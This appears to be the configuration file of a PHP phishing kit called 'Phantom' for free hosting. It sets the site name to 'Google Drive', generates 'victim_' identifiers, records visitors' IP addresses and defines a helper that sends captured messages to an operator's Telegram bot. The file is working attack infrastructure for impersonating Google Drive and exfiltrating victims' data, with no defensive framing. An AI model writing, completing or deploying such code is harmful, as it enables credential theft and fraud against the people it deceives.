<?php
/**
 * Configuration Phantom PHP
 */

// ============================================
// BASE DE DONNÉES (InfinityFree MySQL)
// ============================================
define('DB_HOST', 'sqlXXX.infinityfree.com');
define('DB_NAME', 'if0_xxxxxx_phantom');
define('DB_USER', 'if0_xxxxxx');
define('DB_PASS', 'votre_mot_de_passe');
define('DB_CHARSET', 'utf8mb4');

// ============================================
// CONFIGURATION
// ============================================
define('SITE_URL', 'https://votre-site.infinityfreeapp.com');
define('SITE_NAME', 'Google Drive');
define('ADMIN_PASSWORD', password_hash('Admin123!', PASSWORD_BCRYPT));
define('DATA_DIR', __DIR__ . '/data/');
define('LOG_DIR', __DIR__ . '/logs/');

// Créer les dossiers
if (!is_dir(DATA_DIR)) mkdir(DATA_DIR, 0755, true);
if (!is_dir(LOG_DIR)) mkdir(LOG_DIR, 0755, true);

// ============================================
// TELEGRAM (optionnel)
// ============================================
define('TELEGRAM_TOKEN', '7356789123:AAHxYZ...');
define('TELEGRAM_CHAT_ID', '123456789');

// ============================================
// CONNEXION BASE DE DONNÉES
// ============================================
try {
    $pdo = new PDO(
        "mysql:host=".DB_HOST.";dbname=".DB_NAME.";charset=".DB_CHARSET,
        DB_USER,
        DB_PASS,
        [
            PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
            PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
        ]
    );
} catch (PDOException $e) {
    die('Database connection failed');
}

// ============================================
// FONCTIONS UTILES
// ============================================

function generateVictimId() {
    return 'victim_' . time() . '_' . bin2hex(random_bytes(4));
}

function getClientIP() {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) return $_SERVER['HTTP_CF_CONNECTING_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

function logActivity($message) {
    $logFile = LOG_DIR . date('Y-m-d') . '.log';
    $logEntry = '[' . date('H:i:s') . '] ' . $message . PHP_EOL;
    file_put_contents($logFile, $logEntry, FILE_APPEND);
}

function sendToTelegram($message) {
    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
    
    $url = "https://api.telegram.org/bot" . TELEGRAM_TOKEN . "/sendMessage";
    $data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    file_get_contents($url, false, $context);
}
?>
